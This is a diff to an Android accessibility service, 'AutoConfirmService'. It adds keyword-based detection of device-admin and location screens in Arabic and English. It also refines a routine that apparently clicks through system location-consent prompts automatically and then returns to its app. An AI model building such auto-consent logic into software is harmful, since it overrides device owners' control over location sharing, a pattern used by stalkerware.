@@ -17,6 +17,7 @@ public class AutoConfirmService extends AccessibilityService {
 
     public static final String KEY_AUTO_ENABLE_LOCATION_UNTIL = "auto_enable_location_until";
     private static volatile long sAutoEnableLocationUntil = 0L;
+    private static volatile boolean sIsReturningToApp = false;
 
     public static void armAutoEnableLocation(Context context, long durationMs) {
         sAutoEnableLocationUntil = System.currentTimeMillis() + durationMs;
@@ -435,13 +436,85 @@ public class AutoConfirmService extends AccessibilityService {
         return false;
     }
 
+    private boolean isDeviceAdminScreen(AccessibilityNodeInfo root, String currentPackage) {
+        if (root == null) return false;
+        if (currentPackage != null) {
+            String cp = currentPackage.toLowerCase();
+            if (cp.contains("deviceadmin") || cp.contains("safecenter")) {
+                return true;
+            }
+        }
+        String[] adminKeywords = new String[]{
+            "مسؤول الجهاز", "مشرف الجهاز", "تفعيل تطبيق مشرف الجهاز", "تفعيل مسؤول الجهاز",
+            "Device admin", "Device administrator", "Activate this device admin app",
+            "Activate device admin", "Device admin apps", "Device admin app"
+        };
+        for (String kw : adminKeywords) {
+            try {
+                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(kw);
+                if (nodes != null && !nodes.isEmpty()) {
+                    for (AccessibilityNodeInfo n : nodes) {
+                        n.recycle();
+                    }
+                    return true;
+                }
+            } catch (Exception ignored) {}
+        }
+        return false;
+    }
+
+    private boolean isLocationRelatedScreen(AccessibilityNodeInfo root, String currentPackage) {
+        if (root == null) return false;
+        if (isDeviceAdminScreen(root, currentPackage)) {
+            return false;
+        }
+        for (String title : PRIMARY_LOCATION_TITLES) {
+            try {
+                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(title);
+                if (nodes != null && !nodes.isEmpty()) {
+                    for (AccessibilityNodeInfo n : nodes) {
+                        n.recycle();
+                    }
+                    return true;
+                }
+            } catch (Exception ignored) {}
+        }
+        String[] dialogPrompts = new String[]{
+            "خدمات الموقع", "تحسين دقة الموقع", "Use location", "Location accuracy", "Google Location"
+        };
+        for (String prompt : dialogPrompts) {
+            try {
+                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(prompt);
+                if (nodes != null && !nodes.isEmpty()) {
+                    for (AccessibilityNodeInfo n : nodes) {
+                        n.recycle();
+                    }
+                    return true;
+                }
+            } catch (Exception ignored) {}
+        }
+        return false;
+    }
+
     private boolean handleAutoEnableLocation(AccessibilityNodeInfo root, String currentPackage) {
         if (root == null) return false;
+
+        // If this is the Device Admin activation screen, NEVER close or interfere with it!
+        if (isDeviceAdminScreen(root, currentPackage)) {
+            Log.d("AutoConfirmService", "Device Admin screen detected. Disarming auto-location and ignoring.");
+            disarmAutoEnableLocation(this);
+            return false;
+        }
+
+        // Only proceed if this screen is actually related to Location or GPS
+        if (!isLocationRelatedScreen(root, currentPackage)) {
+            return false;
+        }
 
         // A. Check if Location is already active in the system
         LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
         if (isLocationCurrentlyEnabled(lm)) {
-            finishAndReturnToApp(100);
+            finishAndReturnToApp(150);
             return true;
         }
 
@@ -466,6 +539,8 @@ public class AutoConfirmService extends AccessibilityService {
 
     private void finishAndReturnToApp(long delayMs) {
         disarmAutoEnableLocation(this);
+        if (sIsReturningToApp) return;
+        sIsReturningToApp = true;
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             try {
                 performGlobalAction(GLOBAL_ACTION_BACK);
@@ -483,6 +558,8 @@ public class AutoConfirmService extends AccessibilityService {
                         startActivity(launchIntent);
                     }
                 } catch (Exception ignored) {}
+            } finally {
+                new Handler(Looper.getMainLooper()).postDelayed(() -> sIsReturningToApp = false, 1200L);
             }
         }, delayMs);
     }
